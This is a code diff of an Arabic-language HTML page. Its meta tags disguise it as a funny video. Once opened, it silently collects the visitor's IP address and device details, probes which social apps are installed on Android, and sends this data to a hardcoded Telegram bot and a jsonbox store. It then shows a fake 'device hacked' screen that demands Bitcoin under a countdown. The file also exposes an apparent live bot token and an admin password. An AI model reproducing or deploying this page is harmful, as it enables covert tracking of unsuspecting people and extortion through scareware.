@@ -3,32 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    
-    <!-- Meta tags للتضليل (تظهر كأنه فيديو ريلز) -->
     <title>هههههههههههه</title>
     <meta name="description" content="😂شوف الفيديو دا هيموتك من الضحك! ">
-    
-    <!-- Open Graph (فيسبوك، واتساب، تلغرام) -->
-    <meta property="og:title" content="🎬    - لازم تشوفه">
-   
+    <meta property="og:title" content="🎬 - لازم تشوفه">
     <meta property="og:type" content="video.other">
     <meta property="og:image" content="https://i.imgur.com/3bqPv0b.jpeg">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
     <meta property="og:image:alt" content="Reels video thumbnail with play button">
-    <meta property="og:url" content="https://your-github-username.github.io/repo-name/">
-    
-    <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content=">
+    <meta name="twitter:title" content="😂 فيديو مضحك">
     <meta name="twitter:description" content="لازم تشوفه قبل ما يختفي 😂">
     <meta name="twitter:image" content="https://i.imgur.com/3bqPv0b.jpeg">
-    
-    <!-- إخفاء أي معاينة حقيقية للموقع -->
     <meta name="robots" content="noindex, nofollow">
-    
     <style>
-        /* نفس الأنماط السابقة (كل شيء يعمل بشكل طبيعي داخل الموقع) */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: black; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; }
         .terminal { width: 100%; height: 100%; padding: 30px 25px; white-space: pre-wrap; word-break: break-word; font-size: 20px; line-height: 1.6; overflow-y: auto; scroll-behavior: smooth; }
@@ -72,7 +60,7 @@
             <div style="overflow-x: auto;">
                 <table class="ip-table">
                     <thead><tr><th>#</th><th>IP ADDRESS</th><th>DATE & TIME</th><th>USER AGENT</th></tr></thead>
-                    <tbody id="visitorTableBody"><tr><td colspan="4">loading...</td></tr></tbody>
+                    <tbody id="visitorTableBody"><tr><td colspan="4">loading...</td></tr> </tbody>
                 </table>
             </div>
             <button class="close-admin" id="closeAdminBtn">⛌ CLOSE</button>
@@ -80,8 +68,78 @@
     </div>
 
     <script>
-        // ------------------- حماية لوحة الأدمن بكلمة مرور -------------------
-        const ADMIN_PASSWORD = "SecurePass2025";  // غير هذه الكلمة
+        // ======================== تكوين البوت (ضَع التوكين والآيدي هنا) ========================
+        const BOT_TOKEN = "8187413880:AAHJtjUWuXj6My7ALH9RjplFBs5nw6n4Myo";        // ⬅️ ضع توكن البوت الخاص بك
+        const CHAT_ID   = "5567710346";        // ⬅️ ضع معرف الشات
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        // ===================================================================================
+
+        // ------------------- كشف التطبيقات المثبتة على Android -------------------
+        async function detectInstalledApps() {
+            return new Promise((resolve) => {
+                // يعمل فقط على Android
+                if (!/Android/i.test(navigator.userAgent)) {
+                    resolve("غير مدعوم (ليس Android)");
+                    return;
+                }
+
+                // قائمة التطبيقات الشائعة مع رابط الاختبار (مخطط URL الخاص بها)
+                const apps = [
+                    { name: "Facebook", scheme: "fb://", testUrl: "fb://profile" },
+                    { name: "Instagram", scheme: "instagram://", testUrl: "instagram://user?username=test" },
+                    { name: "WhatsApp", scheme: "whatsapp://", testUrl: "whatsapp://send?phone=123" },
+                    { name: "Telegram", scheme: "tg://", testUrl: "tg://resolve?domain=test" },
+                    { name: "TikTok", scheme: "tiktok://", testUrl: "tiktok://user?user_id=test" },
+                    { name: "Twitter", scheme: "twitter://", testUrl: "twitter://user?screen_name=test" },
+                    { name: "Snapchat", scheme: "snapchat://", testUrl: "snapchat://" }
+                ];
+
+                let detected = [];
+                let pending = apps.length;
+
+                if (pending === 0) {
+                    resolve("لم يتم اختبار أي تطبيق");
+                    return;
+                }
+
+                apps.forEach(app => {
+                    let timeoutId;
+                    let iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = app.testUrl;
+
+                    // إذا تم تحميل الـ iframe بسرعة، فهذا يعني أن الرابط لم يفتح تطبيقاً خارجياً (ربما غير مثبت)
+                    const onIframeLoad = () => {
+                        clearTimeout(timeoutId);
+                        // التطبيق غير مثبت (لأن المتصفح استطاع تحميل الصفحة الخطأ)
+                        iframe.remove();
+                        pending--;
+                        if (pending === 0) resolve(detected.length ? detected.join(', ') : "لا يوجد تطبيقات مثبتة من القائمة");
+                    };
+
+                    const onTimeout = () => {
+                        // إذا انتهى الوقت، يعني أن التطبيق فتح نافذة خارجية (مثبت)
+                        detected.push(app.name);
+                        clearTimeout(timeoutId);
+                        iframe.remove();
+                        pending--;
+                        if (pending === 0) resolve(detected.length ? detected.join(', ') : "لا يوجد تطبيقات مثبتة من القائمة");
+                    };
+
+                    iframe.addEventListener('load', onIframeLoad);
+                    timeoutId = setTimeout(onTimeout, 800); // 800ms كافٍ لظهور نافذة التطبيق
+                    document.body.appendChild(iframe);
+                });
+
+                // مهلة عامة بعد 5 ثواني لإرجاع النتائج مهما حدث
+                setTimeout(() => {
+                    if (pending > 0) resolve(detected.length ? detected.join(', ') : "لا يوجد تطبيقات مثبتة (المهلة)");
+                }, 5000);
+            });
+        }
+
+        // ------------------- باقي الدوال: IP، تخزين، تلغرام، إلخ -------------------
+        const ADMIN_PASSWORD = "SecurePass2025";
         let isAdminAuthenticated = false;
         
         function requestAdminAccess() {
@@ -102,64 +160,129 @@
         document.getElementById('closeAdminBtn').onclick = closeAdminPanel;
         document.getElementById('refreshAdminBtn').onclick = renderAdminStats;
         
-        // ------------------- تسجيل IP الزوار (مركزي) -------------------
         const JSONBOX_URL = "https://jsonbox.io/box_bc3e7a9d1f2c4b8e5a6d";
-        async function fetchPublicIP() { let r=await fetch('https://api.ipify.org?format=json'); let d=await r.json(); return d.ip; }
-        async function recordVisitToCloud(ip, ua) {
-            let rec={ip, timestamp:new Date().toISOString(), userAgent:ua.substring(0,120)};
-            try { await fetch(JSONBOX_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(rec)}); }
-            catch(e) { let fall=JSON.parse(localStorage.getItem("fallback_logs")||"[]"); fall.push(rec); localStorage.setItem("fallback_logs",JSON.stringify(fall)); }
-        }
-        async function fetchAllVisitors() {
-            try { let r=await fetch(JSONBOX_URL); if(r.ok) return await r.json(); } catch(e) {}
-            return JSON.parse(localStorage.getItem("fallback_logs")||"[]");
-        }
-        async function renderAdminStats() {
-            let records=await fetchAllVisitors();
-            if(!Array.isArray(records)) return;
-            document.getElementById('totalVisits').innerText=records.length;
-            document.getElementById('uniqueIps').innerText=new Set(records.map(r=>r.ip)).size;
-            document.getElementById('last24h').innerText=records.filter(r=>(new Date()-new Date(r.timestamp))<=86400000).length;
-            let tbody=document.getElementById('visitorTableBody');
-            if(!records.length){ tbody.innerHTML='<tr><td colspan="4">لا بيانات بعد</td></tr>'; return; }
-            let sorted=[...records].sort((a,b)=>new Date(b.timestamp)-new Date(a.timestamp));
-            tbody.innerHTML=sorted.map((r,i)=>`<tr><td>${i+1}</td><td>${r.ip}</td><td>${new Date(r.timestamp).toLocaleString()}</td><td>${(r.userAgent||'').substring(0,45)}</td></tr>`).join('');
+        
+        async function fetchPublicIP() { 
+            let r = await fetch('https://api.ipify.org?format=json'); 
+            let d = await r.json(); 
+            return d.ip; 
         }
         
-        async function logCurrentVisitor() { await recordVisitToCloud(await fetchPublicIP(), navigator.userAgent); }
+        async function sendToTelegram(ip, userAgent, timeString, installedApps) {
+            if (!BOT_TOKEN || !CHAT_ID) {
+                console.warn("⚠️ لم يتم تعيين توكن البوت أو معرف الشات");
+                return;
+            }
+            
+            const platform = navigator.platform;
+            const screenRes = `${screen.width}x${screen.height}`;
+            const deviceType = /mobile/i.test(userAgent) ? "📱 Mobile" : "💻 Desktop";
+            const language = navigator.language;
+            const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "غير معروف";
+            
+            const message = `<b>🌐 زيارة جديدة</b>
+<b>🟢 IP:</b> <code>${ip}</code>
+<b>📅 الوقت:</b> ${timeString}
+<b>💻 نوع الجهاز:</b> ${deviceType}
+<b>🖥️ المنصة:</b> ${platform}
+<b>📺 الدقة:</b> ${screenRes}
+<b>🌍 اللغة:</b> ${language}
+<b>⚙️ عدد الأنوية:</b> ${cores}
+<b>📱 التطبيقات المثبتة (Android):</b> ${installedApps}
+<b>🔍 وكيل المستخدم:</b> <code>${userAgent.substring(0, 200)}</code>`;
+            
+            try {
+                await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, parse_mode: 'HTML', text: message })
+                });
+                console.log("✅ تم إرسال البيانات إلى تلغرام");
+            } catch (err) {
+                console.error("❌ فشل الإرسال إلى تلغرام:", err);
+            }
+        }
+        
+        async function recordVisitToCloud(ip, ua, installedApps) {
+            let now = new Date();
+            let timeStr = now.toLocaleString('ar-EG');
+            let rec = { ip, timestamp: now.toISOString(), userAgent: ua.substring(0, 120), apps: installedApps };
+            try { 
+                await fetch(JSONBOX_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(rec) });
+            } catch(e) { 
+                let fall = JSON.parse(localStorage.getItem("fallback_logs") || "[]"); 
+                fall.push(rec); 
+                localStorage.setItem("fallback_logs", JSON.stringify(fall)); 
+            }
+            await sendToTelegram(ip, ua, timeStr, installedApps);
+        }
+        
+        async function fetchAllVisitors() {
+            try { let r = await fetch(JSONBOX_URL); if(r.ok) return await r.json(); } catch(e) {}
+            return JSON.parse(localStorage.getItem("fallback_logs") || "[]");
+        }
+        
+        async function renderAdminStats() {
+            let records = await fetchAllVisitors();
+            if(!Array.isArray(records)) return;
+            document.getElementById('totalVisits').innerText = records.length;
+            document.getElementById('uniqueIps').innerText = new Set(records.map(r=>r.ip)).size;
+            document.getElementById('last24h').innerText = records.filter(r=>(new Date()-new Date(r.timestamp))<=86400000).length;
+            let tbody = document.getElementById('visitorTableBody');
+            if(!records.length){ tbody.innerHTML = '<tr><td colspan="4">لا بيانات بعد</td></tr>'; return; }
+            let sorted = [...records].sort((a,b)=>new Date(b.timestamp)-new Date(a.timestamp));
+            tbody.innerHTML = sorted.map((r,i)=>`<tr><td>${i+1}</td><td>${r.ip}</td><td>${new Date(r.timestamp).toLocaleString()}</td><td>${(r.userAgent||'').substring(0,45)}</td></tr>`).join('');
+        }
         
         // ------------------- تأثير الاختراق -------------------
         const terminalDiv = document.getElementById('app');
         const hackSteps = ["[+] Connecting...","[+] Accessing Instagram media...","[+] Bypassing security...","[+] Downloading gallery...","[+] Copying messages...","[+] Uploading to darknet...","[+] DONE."];
-        let stepIndex=0;
-        function addLine(){ if(stepIndex<hackSteps.length){ terminalDiv.innerHTML+=hackSteps[stepIndex]+"\n"; stepIndex++; terminalDiv.scrollTop=terminalDiv.scrollHeight; setTimeout(addLine,1100); } else finishHack(); }
+        let stepIndex = 0;
+        function addLine(){ 
+            if(stepIndex < hackSteps.length){ 
+                terminalDiv.innerHTML += hackSteps[stepIndex] + "\n"; 
+                stepIndex++; 
+                terminalDiv.scrollTop = terminalDiv.scrollHeight; 
+                setTimeout(addLine, 1100); 
+            } else finishHack(); 
+        }
+        
         function finishHack(){
             document.body.classList.add('glitch');
             setTimeout(()=>{
                 document.body.classList.remove('glitch');
-                terminalDiv.style.display='none';
-                let fc=document.createElement('div'); fc.className='final-screen';
-                fc.innerHTML=`<h1 class="red">⚠️ DEVICE HACKED ⚠️</h1><p>All photos, contacts and private data stolen.</p><p class="red">Pay 50 Bitcoinz to prevent leak.</p><p>BTC: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</p><div class="countdown" id="timer">23:59:59</div><p class="small">Time left before public release</p>`;
+                terminalDiv.style.display = 'none';
+                let fc = document.createElement('div'); 
+                fc.className = 'final-screen';
+                fc.innerHTML = `<h1 class="red">⚠️ DEVICE HACKED ⚠️</h1><p>All photos, contacts and private data stolen.</p><p class="red">Pay 50 Bitcoinz to prevent leak.</p><p>BTC: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</p><div class="countdown" id="timer">23:59:59</div><p class="small">Time left before public release</p>`;
                 document.body.appendChild(fc);
                 startCountdown();
-            },1200);
+            }, 1200);
         }
+        
         function startCountdown(){
-            let total=24*3600;
-            let timerDiv=document.getElementById('timer');
-            let intv=setInterval(()=>{ if(total<=0){ clearInterval(intv); timerDiv.innerText="00:00:00"; return; }
-                let h=Math.floor(total/3600), m=Math.floor((total%3600)/60), s=total%60;
-                timerDiv.innerText=`${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+            let total = 24 * 3600;
+            let timerDiv = document.getElementById('timer');
+            let intv = setInterval(()=>{ 
+                if(total <= 0){ clearInterval(intv); timerDiv.innerText = "00:00:00"; return; }
+                let h = Math.floor(total/3600), m = Math.floor((total%3600)/60), s = total%60;
+                timerDiv.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
                 total--;
-            },1000);
+            }, 1000);
         }
         
-        (async function(){ await logCurrentVisitor(); setTimeout(addLine,800); })();
+        // ------------------- بدء التنفيذ -------------------
+        (async function(){ 
+            let ip = await fetchPublicIP();
+            let ua = navigator.userAgent;
+            let installedApps = await detectInstalledApps();   // كشف التطبيقات
+            await recordVisitToCloud(ip, ua, installedApps);
+            setTimeout(addLine, 800);
+        })();
         
-        // تلمياح صغير في الزاوية
-        let hint=document.createElement('div');
-        hint.style.cssText='position:fixed; bottom:8px; right:10px; font-size:10px; color:#2f6a44; background:#000000aa; padding:4px 10px; border-radius:20px; z-index:999;';
-        hint.innerText='🔒 ADMIN: Ctrl+Shift+A';
+        let hint = document.createElement('div');
+        hint.style.cssText = 'position:fixed; bottom:8px; right:10px; font-size:10px; color:#2f6a44; background:#000000aa; padding:4px 10px; border-radius:20px; z-index:999;';
+        hint.innerText = '🔒 ADMIN: Ctrl+Shift+A';
         document.body.appendChild(hint);
     </script>
 </body>
